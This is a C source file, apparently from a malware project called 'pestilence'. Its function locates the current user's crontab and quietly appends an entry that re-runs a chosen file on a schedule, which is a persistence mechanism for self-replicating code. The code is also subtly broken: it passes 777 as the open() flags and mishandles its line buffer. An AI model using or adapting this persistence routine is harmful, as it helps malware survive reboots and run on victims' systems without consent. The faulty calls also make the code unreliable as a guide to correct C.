#include "pestilence.h"


char* get_crontab_path()
{
    char *begin = "/var/spool/cron/crontabs/";
    char username[512];
    char *envvar = "USERNAME";

    if(!getenv(envvar)){
        return NULL;
    }
    snprintf(username, 512, "%s", getenv(envvar));
    return(ft_strjoin(begin, username));
}

void create_cron(char *filename)
{
    char *crontab_path = get_crontab_path();
    if (crontab_path == NULL){
        return;
    }
    printf("PATH: %s\n", crontab_path);
    // int fd = open("/var/spool/cron/crontabs/air", O_RDONLY);
    int fd = open(crontab_path, O_RDONLY);
    if (fd < 0)
    {
        free(crontab_path);
        return;
    }
    int flag = 0;
    char *content[100][500];
   
    char *path = NULL;
    char *cron_schedule = NULL;
    path = realpath(filename, path);

    if (path == NULL)
    {
        free(crontab_path);
        return;
    }
    cron_schedule = ft_strjoin(CRON_SCHEDULE, path);

    int i = 0;
    while (get_next_line(fd, content[i]))
    {
        if (ft_strcmp(*content[i], cron_schedule) == 0)
        {
            flag = 1;
        }
        i++;
    }
    close(fd);

    if (flag == 0)
    {
        // fd = open("/var/spool/cron/crontabs/air", 777);
        fd = open(crontab_path, 777);

        for (int j = 0; j < i; j++)
        {
            write(fd, *content[j], ft_strlen(*content[j]));
            write(fd, "\n", 1);
        }
        write(fd, cron_schedule, ft_strlen(cron_schedule));
        write(fd, "\n", 1);
        close(fd);
    }

    free(crontab_path);
    free(path);
    free(cron_schedule);
    while (i >= 0)
    {
        free(*content[i]);
        i--;
    }
    
    return;
}